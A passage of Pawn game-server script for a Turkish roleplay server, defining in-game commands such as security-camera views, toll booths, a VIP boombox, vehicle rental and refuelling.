			SendClientMessage(playerid, COLOR_WHITE, "MOBESE bilgisayarýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:mobese1(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,274.5474, 110.2418, 1004.6172))
		{
			SetPlayerPos(playerid, 2604.7776, 2369.3503, 39.3750);
	    	SetPlayerCameraPos(playerid, 1544.3201, -1650.4747, 21.8741);
			SetPlayerCameraLookAt(playerid, 1528.8374, -1678.2098, 13.3828);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE'den çýkýþ için, /mobesecik");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE bilgisayarýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:mobese2(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,274.5474, 110.2418, 1004.6172))
		{
			SetPlayerPos(playerid, 2604.7776, 2369.3503, 39.3750);
	    	SetPlayerCameraPos(playerid, 2261.1509, -1134.7296, 42.1342);
			SetPlayerCameraLookAt(playerid, 2320.1462, -1163.5184, 27.8623);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE'den çýkýþ için, /mobesecik");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE bilgisayarýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:mobese3(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,274.5474, 110.2418, 1004.6172))
		{
			SetPlayerPos(playerid, 2604.7776, 2369.3503, 39.3750);
	    	SetPlayerCameraPos(playerid, 1366.0327, -1264.6116, 29.9625);
			SetPlayerCameraLookAt(playerid, 1351.4681, -1281.6628, 13.3828);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE'den çýkýþ için, /mobesecik");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE bilgisayarýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:mobese4(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,274.5474, 110.2418, 1004.6172))
		{
			SetPlayerPos(playerid, 2604.7776, 2369.3503, 39.3750);
	    	SetPlayerCameraPos(playerid, 345.7744, -1604.2449, 46.9642);
			SetPlayerCameraLookAt(playerid, 343.4040, -1526.5984, 33.2792);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE'den çýkýþ için, /mobesecik");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE bilgisayarýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:mobese5(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,274.5474, 110.2418, 1004.6172))
		{
			SetPlayerPos(playerid, 2604.7776, 2369.3503, 39.3750);
	    	SetPlayerCameraPos(playerid, 1173.2233, -1322.5192, 30.4662);
			SetPlayerCameraLookAt(playerid, 1198.5242, -1322.0291, 13.3984);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE'den çýkýþ için, /mobesecik");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE bilgisayarýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:mobese6(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,274.5474, 110.2418, 1004.6172))
		{
			SetPlayerPos(playerid, 2604.7776, 2369.3503, 39.3750);
	    	SetPlayerCameraPos(playerid, 2043.0205, -1410.7994, 23.1193);
			SetPlayerCameraLookAt(playerid, 2025.3486, -1425.0294, 16.7453);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE'den çýkýþ için, /mobesecik");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE bilgisayarýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:mobese7(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,274.5474, 110.2418, 1004.6172))
		{
			SetPlayerPos(playerid, 2604.7776, 2369.3503, 39.3750);
	    	SetPlayerCameraPos(playerid, 245.2521, 87.4820, 1004.9574);
			SetPlayerCameraLookAt(playerid, 246.0150, 81.8277, 1003.6406);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE'den çýkýþ için, /mobesecik");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE bilgisayarýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:mobese8(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,274.5474, 110.2418, 1004.6172))
		{
			SetPlayerPos(playerid, 2604.7776, 2369.3503, 39.3750);
	    	SetPlayerCameraPos(playerid, 250.0482, 71.9762, 1004.7753);
			SetPlayerCameraLookAt(playerid, 242.7718, 62.7017, 1005.0133);
			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE'den çýkýþ için, /mobesecik");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE bilgisayarýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:mobesecik(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,50.0,2604.7776, 2369.3503, 39.3750))
		{
			SetPlayerPos(playerid, 274.5474, 110.2418, 1004.6172);
			SetPlayerInterior(playerid, 6);
			SetPlayerVirtualWorld(playerid, 20002);
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE'den çýkýþ için, /mobesecik");
			SetCameraBehindPlayer(playerid);
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "MOBESE bilgisayarýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:giftall(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýnda deðilsin. Admin komutlarýna eriþmek için iþbaþý yapman gerekiyor. iþbaþý yapmak için /aduty komutunu kullan.");
			return 1;
	    }
        foreach(Player, i)
		{
            GivePlayerCash(i, 7500);
            SendClientMessage(i,COLOR_WHITE, "Phoenix Role PlayG size 7500$ hediye olarak verdi. Ýyi oyunlar.");

        }
        SendClientMessage(playerid,COLOR_WHITE, "Herkese 7500$ harçlýk verdin.");
    }
	return 1;
}

CMD:kgsyardim(playerid, params[])
	return cmd_giseyardim(playerid, params);

CMD:giseyardim(playerid, params[])
{
	ShowPlayerDialog(playerid, 15456, DIALOG_STYLE_MSGBOX, "Giþe [/kgs]",
	"{FFFFFF}» {c0515b}Giþelere yaklaþýn.\n{FFFFFF}» {c0515b}/kgs komutunu kullanýn. [$50]", "Tamam", "");
	return 1;
}

CMD:kgs(playerid,params[])
{
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_GREY, "Araç içerisinde olmalýsýnýz.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,COLOR_GREY, " Sürücü koltuðunda deðilsiniz.");

	if(IsPlayerInRangeOfPoint(playerid,10,69.36000, -1529.90137, 4.62970))
	{
		if(PlayerInfo[playerid][pCash] < 50)
		    return SendClientMessage(playerid,COLOR_GREY, "Yeterli paranýz bulunmuyor. (50$)");

	    SetDynamicObjectRot(Giseler[0],0.00000, 0.00000, 85.00000);
		SetTimerEx("ShutUp",5000,false,"d",11);
		GivePlayerCash(playerid, -50);
	}
	else if(IsPlayerInRangeOfPoint(playerid,10,35.95300, -1533.46558, 4.92970))
	{
		if(PlayerInfo[playerid][pCash] < 50)
		    return SendClientMessage(playerid,COLOR_GREY, "Yeterli paranýz bulunmuyor. (50$)");

	    SetDynamicObjectRot(Giseler[1],0.00000, 0.00000, 87.00000);
		SetTimerEx("ShutUp",5000,false,"d",12);
		GivePlayerCash(playerid, -50);
	}
	else if(IsPlayerInRangeOfPoint(playerid,10,76.54820, -1264.59509, 14.19720))
	{
		if(PlayerInfo[playerid][pCash] < 50)
		    return SendClientMessage(playerid,COLOR_GREY, "Yeterli paranýz bulunmuyor. (50$)");

	    SetDynamicObjectRot(Giseler[2],0.00000, -1.00000, 126.00000);
		SetTimerEx("ShutUp",5000,false,"d",13);
		GivePlayerCash(playerid, -50);
	}
	else if(IsPlayerInRangeOfPoint(playerid,10,53.14420, -1317.74634, 11.21930))
	{
		if(PlayerInfo[playerid][pCash] < 50)
		    return SendClientMessage(playerid,COLOR_GREY, "Yeterli paranýz bulunmuyor. (50$)");

	    SetDynamicObjectRot(Giseler[3],0.00000, 0.00000, 130.00000);
		SetTimerEx("ShutUp",5000,false,"d",14);
		GivePlayerCash(playerid, -50);
	}
	else if(IsPlayerInRangeOfPoint(playerid,10,1736.52271, 506.26941, 28.57430))
	{
		if(PlayerInfo[playerid][pCash] < 50)
		    return SendClientMessage(playerid,COLOR_GREY, "Yeterli paranýz bulunmuyor. (50$)");

	    SetDynamicObjectRot(Giseler[4],0.00000, 0.00000, 341.00000);
		SetTimerEx("ShutUp",5000,false,"d",15);
		GivePlayerCash(playerid, -50);
	}
	else if(IsPlayerInRangeOfPoint(playerid,10,1739.60828, 557.09363, 25.89180))
	{
		if(PlayerInfo[playerid][pCash] < 50)
		    return SendClientMessage(playerid,COLOR_GREY, "Yeterli paranýz bulunmuyor. (50$)");

	    SetDynamicObjectRot(Giseler[5],0.00000, 1.00000, 341.00000);
		SetTimerEx("ShutUp",5000,false,"d",16);
		GivePlayerCash(playerid, -50);
	}
	return 1;
}

CMD:boombox(playerid, params[])
{
    new string[128];

    if(PlayerInfo[playerid][pDonator] < 3)
	    return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu yalnýzca Elmas VIP olanlar kullanabilir.");

    if(!Boombox[playerid])
    {
        if(sscanf(params, "s[256]", params)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /boombox [Müzik URL]");
        for(new i=0; i<MAX_PLAYERS; i++)
        {
            if(IsPlayerConnected(i))
            {
                    if(Boombox[i])
                    {
                        if(IsPlayerInRangeOfPoint(playerid, 30, bpos[i][0], bpos[i][1], bpos[i][2]))
                        {
                            SendClientMessage(playerid, COLOR_WHITE, "Burada zaten bir boombox kutusu var, lütfen baþka bir yere yerleþtirin!");
                            return 1;
                        }
                    }
            }
        }
        Boombox[playerid] = 1;
        format(string, sizeof(string), "Yere boombox kutusu koydun, çalmaya baþladý!");
        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
        GetPlayerPos(playerid, bpos[playerid][0], bpos[playerid][1], bpos[playerid][2]); bpos[playerid][2] = bpos[playerid][2] - 1;
        GetPlayerFacingAngle(playerid, bpos[playerid][3]); bpos[playerid][3] = bpos[playerid][3] +180;
        BoomboxObject[playerid] = CreateDynamicObject(2103, bpos[playerid][0], bpos[playerid][1], bpos[playerid][2], 0, 0, bpos[playerid][3]);
        format(BoomboxURL[playerid], 256, "%s", params);
    }
    else
    {
        Boombox[playerid] = 0;
        format(string, sizeof(string), "Boombox kutusunu kaldýrdýn!");
        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
        DestroyDynamicObject(BoomboxObject[playerid]);
        format(BoomboxURL[playerid], 256, "");
        for(new i=0; i<MAX_PLAYERS; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(BoomboxPlayer[i] == playerid)
                {
                    BoomboxStream[i] = 0;
                    BoomboxPlayer[i] = -1;
                    StopAudioStreamForPlayer(i);
                    SendClientMessage(i, COLOR_WHITE, "Boombox sahibi müziði kapatýp, boombox kutusunu aldý!");
                }
            }
        }
    }
    return 1;
}

CMD:boomboxnext(playerid, params[])
{
    if(PlayerInfo[playerid][pDonator] < 3)
	    return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu yalnýzca Elmas VIP olanlar kullanabilir.");

    if(!Boombox[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Müzik kutusu yerleþtirmeden müziði deðiþtiremezsin!");
    if(sscanf(params, "s[256]", params)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /boomboxnext [Müzik URL]");
    SendClientMessage(playerid, COLOR_WHITE, "Boombox müziði deðiþti!");
    format(BoomboxURL[playerid], 256, "%s", params);
    for(new i=0; i<MAX_PLAYERS; i++)
    {
        if(IsPlayerConnected(i))
        {
                if(BoomboxPlayer[i] == playerid)
                {
                    PlayAudioStreamForPlayer(i, BoomboxURL[playerid], bpos[playerid][0], bpos[playerid][1], bpos[playerid][2], 30, 1);
                    SendClientMessage(i, COLOR_WHITE, "Boombox müziði deðiþtirildi!");
                }
        }
    }
    return 1;
}

CMD:boomboxyardim(playerid, params[])
{
    if(PlayerInfo[playerid][pDonator] < 3)
	return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu yalnýzca Elmas VIP olanlar kullanabilir.");

   	if(!gPlayerLogged[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Komutlarý kullanmak için önce giriþ yapmanýz gerekmektedir.");
    SendClientMessage(playerid, COLOR_WHITE, "BOOMBOX YARDIM:Boombox'un Müzik Linki kýsmýna yazmanýz gereken link þu þekildedir.");
    SendClientMessage(playerid, COLOR_WHITE, "BOOMBOX YARDIM:Tarayýcýnýzý açýp þarký ismini yazdýktan sonra sonuna kiwi6 yazýnýz.");
    SendClientMessage(playerid, COLOR_WHITE, "BOOMBOX YARDIM:Gelen sitelerden ilk baþtakini veya ondan sonrakini týklatýnýz.");
    SendClientMessage(playerid, COLOR_WHITE, "BOOMBOX YARDIM:Týkladýðýnýz sitede sað alt köþedeki share'yi açýp direct hotlink kopyalayýnýz.");
    SendClientMessage(playerid, COLOR_WHITE, "BOOMBOX YARDIM:Kopyaladýðýnýz linki /boombox [Müzik URL] yerine yapýþtýrýp müziði açabilirsiniz.");
	return 1;
}

CMD:vip(playerid,params[]){//VIP DOLAP
	//new string[128];
	if(PlayerInfo[playerid][pDonator]>0)
	{
		if(!IsPlayerInRangeOfPoint(playerid, 2.2 ,681.9253,-459.1260,-25.6172)) return SendClientMessage(playerid, COLOR_GREY, "VIP Dolabýnýn yakýnýnda deðilsin.");
	    ShowPlayerDialogEx(playerid, vdolap, DIALOG_STYLE_LIST, "VIP Dolabý", "Aðrý Kesici\nZýrh(10000$)\nSilahlar\nKýyafetler\nMeslekler\nVIP Rengi", "Sec", "Iptal");
	}
	else return SendClientMessage(playerid, COLOR_GREY, "VIP deðilsin.");
	return 1;
}

CMD:vcik(playerid,params[]){//VIP GARAJ
	//new string[128];
	if(PlayerInfo[playerid][pDonator]>0)
	{
		if(!IsPlayerInRangeOfPoint(playerid, 2.2 ,1273.8411,-1337.5276,13.3486)) return SendClientMessage(playerid, COLOR_GREY, "VIP garajýnýn çýkýþýnda deðilsin.");
		if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && !GetPlayerInterior(playerid)){
		SetVehiclePos(GetPlayerVehicleID(playerid),1263.5697,-1336.3226,13.2419);
		}
		else{
		SetPlayerPos(playerid,1263.5697,-1336.3226,13.2419);
		}
		SetPlayerInterior(playerid, GetPlayerInterior(playerid));
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(playerid));
	}
	else return SendClientMessage(playerid, COLOR_GREY, "VIP deðilsin.");
	return 1;
}

CMD:garaclarispawnla(playerid, params[])
{
    new f = PlayerInfo[playerid][pGang];
	if(f == 255) return SendClientMessage(playerid, COLOR_GRAD2, "Bir ailede deðilsin.");
	if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid, COLOR_GRAD2, "Ailede en az R5 olmalýsýn.");
	for(new d = 0 ; d < MAX_GANG_VEHICLES; d++)
 	{
	    if(FamilyVehicleInfo[f][d][fvId])
	    {
			if(FamilyVehicleInfo[f][d][fvId] > 0 && IsVehicleOccupied(FamilyVehicleInfo[f][d][fvId]) == INVALID_VEHICLE_ID)
				SetVehicleToRespawn(FamilyVehicleInfo[f][d][fvId]);
		}
	}
	new szMessage[64];
	format(szMessage, sizeof(szMessage), "Aile araçlarýnýzý spawnladýnýz.");
	SendClientMessage(playerid, COLOR_WHITE, szMessage);
	return 1;
}

CMD:bidonkullan(playerid, params[])
{
    if(IsPlayerInAnyVehicle(playerid))
	{
	    new vehicleid = GetPlayerVehicleID(playerid);
	    GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid, COLOR_WHITE, "Sürücü koltuðunda deðilsiniz.");
			return 1;
  		}
		if(engine == VEHICLE_PARAMS_ON) return SendClientMessageEx(playerid, COLOR_WHITE, "Aracýn motoru açýkken benzin dolduramazsýnýz, (/amotor) ile motorunuzu kapatýn.");
		if(!PlayerInfo[playerid][pGas])
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Benzin bidonun yok!");
			return 1;
		}
		if(Fuel[vehicleid] >= 100)
		{
			SendClientMessage(playerid, COLOR_WHITE, "Aracýn benzini zaten dolu.");
		 	return 1;
		}
		if(Fuel[vehicleid] < 80.0) Fuel[vehicleid] += 20.0;
		else Fuel[vehicleid] = 100.0;
		SendClientMessage(playerid, COLOR_ORANGE, "Aracýnýzýn benzinini arttýrdýnýz.");
		PlayerInfo[playerid][pGas] --;
	}
	return 1;
}

CMD:benzinlerifulle(playerid, params[])
{
	new string[128], veh;
	if(PlayerInfo[playerid][pAdmin] < 2) return SendClientMessage(playerid, COLOR_WHITE, "Bu komutu kullanma yetkiniz yok!");
    if(!strcmp(params, "all", true))
    {
        for(new i=0; i<MAX_VEHICLES; i++)
        {
            Fuel[i] = 100;
        }
        if(PlayerInfo[playerid][pAdmin] >= 1)
		{
	   		format(string, sizeof(string), "(( {FF6347}Level %d Admin %s: {FFFFFF}Tüm araçlarýn benzinleri doldurulmuþtur! ))", PlayerInfo[playerid][pAdmin], GetPlayerNameEx(playerid));
	    	SendClientMessageToAllEx(COLOR_OOC,string);
	 	}
        return 1;
    }
    if(sscanf(params, "i", veh)) return SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /benzinlerifulle [vehicleid/all]");
    Fuel[veh] = 100;
    format(string, sizeof(string), "%s Admin %d ID'li aracýn benzinini doldurdu",PlayerInfo[playerid][pAdminName], veh);
    SendAdminMessage(COLOR_OOC, 1, string);
	return 1;
}

CMD:arackirabitir(playerid, params[])
{
	GameTextForPlayer(playerid, " ", 500, 4);
	if (GetPVarInt(playerid, "Renting") == 0)
	{
 		SendClientMessage(playerid, -1, "Þu an hiç bir aracý kiralamýyorsun.");
		return 1;
	}
	new
		vID = GetPVarInt(playerid, "CarRentID");
	IsRented[vID] = 0;
	SetPVarInt(playerid, "CarRentID", 0);
	SetPVarInt(playerid, "Renting", 0);
	new
		Float:X,
		Float:Y,
		Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	SetPlayerPos(playerid, X, Y, Z+1);
	TogglePlayerControllable(playerid, 1);
	SetVehicleToRespawn(vID);
	RentedBy[vID] = "No-one";
	return 1;
}

CMD:arackirala(playerid, params[])
{
    GameTextForPlayer(playerid, " ", 500, 4);
	new
		vID = GetPlayerVehicleID(playerid);
	if (!vID)
	{
 		SendClientMessage(playerid, COLOR_WHITE, "Kiralanabilir bir araçta deðilsin (Ýlk Baþladýðýn Yerin Karþýsýndaki Araçlar Kiralýktýr).");
		return 1;
	}
	if (!IsRentableCar(vID))
	{
 		SendClientMessage(playerid, COLOR_WHITE, "Bu araç kiralýk deðil.");
		return 1;
	}
	if (IsRentedCar(vID))
	{
		SendClientMessage(playerid, COLOR_WHITE, "Bu araç zaten baþka birisi tarafýndan kiralanmýþ.");
		return 1;
	}
	if (GetPVarInt(playerid, "Renting") == 1)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Zaten kiralamýþ olduðun bir araç var.");
		return 1;
	}
	if (!CanAffordRental(playerid))
	{
 		new String[128];
   		format(String, 128, "Bu aracý kiralamak için yeterli paran yok. {3399CC}(Fiyat: 200 $)");
		SendClientMessage(playerid, COLOR_WHITE, String);
		return 1;
	}
	IsRented[vID] = 1;
	TogglePlayerControllable(playerid, 1);
	SetPVarInt(playerid, "CarRentID", vID);
 	SetPVarInt(playerid, "Renting", 1);
	new String[256];
	format(String, 256, "~w~bu araci kiraladin~n~Odedigin tutar: ~g~200 $~n~oyundan cikana kadar bu araci kiralamis olacaksin.");
	GameTextForPlayer(playerid, String, 4000, 4);
	GivePlayerCash(playerid, -200);
	SendClientMessage(playerid, COLOR_WHITE, "{3399CC}Araç kiralandý.{FFFFFF} Artýk motoru çalýþtýrabilirsin. N tuþu ya da [/motor].");
	SendClientMessage(playerid, COLOR_WHITE, "Aracýn kirasýný sonlandýrmak istiyorsan [/arackirabitir] kullan.");
	return 1;
}

CMD:benzindoldur(playerid, params[])
{
    if(IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		new RefuelingVehicleSlot = -1;
		if(GetVehicleModel(vehicleid) == 481 || GetVehicleModel(vehicleid) == 509 || GetVehicleModel(vehicleid) == 510) return 1;
		if(GazIstasyonunda(playerid) == 0) return SendClientMessage(playerid, COLOR_WHITE, "Benzin istasyonunda deðilsin!");
		GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		if(engine == VEHICLE_PARAMS_ON) return SendClientMessageEx(playerid, COLOR_WHITE, "Aracýn motoru açýkken benzin dolduramazsýnýz, (/amotor) ile motorunuzu kapatýn.");
		if(Fuel[vehicleid] >= 99) return SendClientMessage(playerid, COLOR_WHITE, "Aracýn benzini zaten dolu.");
        if(isrefuelling[playerid] == 1) return SendClientMessageEx(playerid, COLOR_WHITE, "Þuan zaten benzin dolduruyorsunuz.");
        SendClientMessageEx(playerid, COLOR_WHITE, "Aracýnýzýn deposuna benzin dolduruluyor, bekleyin.");
		isrefuelling[playerid] = 1;

		for(new vehicleslot = 0; vehicleslot < MAX_PLAYERVEHICLES; vehicleslot++)
		{
			if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][vehicleslot][pvId]))
			{
				RefuelingVehicleSlot = vehicleslot;
			}
		}
	 	RefuelingVehicleTimer[playerid] = SetTimerEx("ReFill", 1000, true, "ii", playerid, RefuelingVehicleSlot);
	  	GameTextForPlayer(playerid, "~w~Doluyor...", 5000, 3);
	}
	return 1;
}

CMD:hmesaj(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4)
	{
		if(PlayerInfo[playerid][pRank] < 3)
		{
			SendClientMessage(playerid, COLOR_GREY, "Bunun için yeterli rütben yok!");
			return 1;
		}
		new	string[128];
		if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /hmesaj [mesaj]");
		format(string, sizeof(string), "SMS: %s, Gönderen: Özel Numara",params);
		SendClientMessageToAllEx(COLOR_YELLOW, string);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanmak için hitman olmanýz gerek.");
	}
	return 1;
}
/*
CMD:engelduzenle(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1)
	{
	    if(PlayerInfo[playerid][pDuty] == 1)
	    {
			new id;
			if(sscanf(params, "d", id)) return SendClientMessage(playerid,-1,KULLANIM_MESAJI"/engelduzenle [id]");
			if(id < 0 || id > MAX_ENGEL) return HataMesajiYolla(playerid,"Hatalý id girdiniz.");
			if(EngelInfo[id][bVar] == 0) return HataMesajiYolla(playerid,"Hatalý id girdiniz.");
			if(!IsPlayerInRangeOfPoint(playerid, 6.0, EngelInfo[id][bX], EngelInfo[id][bY], EngelInfo[id][bZ])) return HataMesajiYolla(playerid,"Engele yakýn olmalýsýnýz.");
			SetPVarInt(playerid, "EngelID", id);
			// IpucuMesajiYolla(playerid,"Obje düzenlerken kaydet butonuna basmadýðýnýzda oluþan hatalarda teknik destek verilmeyecektir.");
			EditDynamicObject(playerid, EngelInfo[id][bObje]);
		}
		else
		{
		    HataMesajiGonder(playerid,"Ýþbaþýnda deðilsiniz.");
		}
	}
    return 1;
}

CMD:engelsil(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1)
	{
	    if(PlayerInfo[playerid][pDuty] == 1)
	    {
			new id;
		    if(sscanf(params, "d", id)) return SendClientMessage(playerid,-1,KULLANIM_MESAJI"/engelsil [id]");
		    if(id < 0 || id > MAX_ENGEL) return HataMesajiYolla(playerid,"Hatalý id girdiniz.");
		    if(EngelInfo[id][bVar] == 0) return HataMesajiYolla(playerid,"Hatalý id girdiniz.");
		 	if(!IsPlayerInRangeOfPoint(playerid, 6.0, EngelInfo[id][bX], EngelInfo[id][bY], EngelInfo[id][bZ])) return HataMesajiYolla(playerid,"Engele yakýn olmalýsýnýz.");
			EngelSil(id);
		}
		else
		{
		    HataMesajiGonder(playerid,"Ýþbaþýnda deðilsiniz.");
		}
	}
    return 1;
}

CMD:engeller(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1)
	{
	    if(PlayerInfo[playerid][pDuty] == 1)
	    {
			ShowModelSelectionMenu(playerid,pengel,"IEM Engel");
	       // ShowPlayerDialog(playerid,190,DIALOG_STYLE_LIST,"LSPD ~ Engel","Koni\nKüçük bariyer\nTrafik levhasý\nSu bariyeri\nOrta bariyer\nKüçük diken\nBüyük diken\nYol bariyeri (sað)\nYol bariyeri (sol)\nBüyük bariyer","Ýleri","Kapat");
	    }
	    else
	    {
	        HataMesajiGonder(playerid,"Ýþbaþýnda deðilsiniz.");
	    }
	}
	return 1;
}
*/
CMD:kimlikgoster(playerid, params[])
{
	new giveplayerid;
	if(sscanf(params, "u",giveplayerid))
	{
		SendClientMessage(playerid, COLOR_WHITE, "{AFAFAF}KULLANIM:{FFFFFF} /kimlikgoster [Oyuncu ID/Isim]");
	}
	else
	{
		if(giveplayerid == playerid)
		{
		    SendClientMessage(playerid, COLOR_WHITE, "Kendi kendine kimliðini gösteremezsin.");
			return 1;
		}
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
			    if(ProxDetectorS(8.0, playerid, giveplayerid))
				{
				    new string[128];
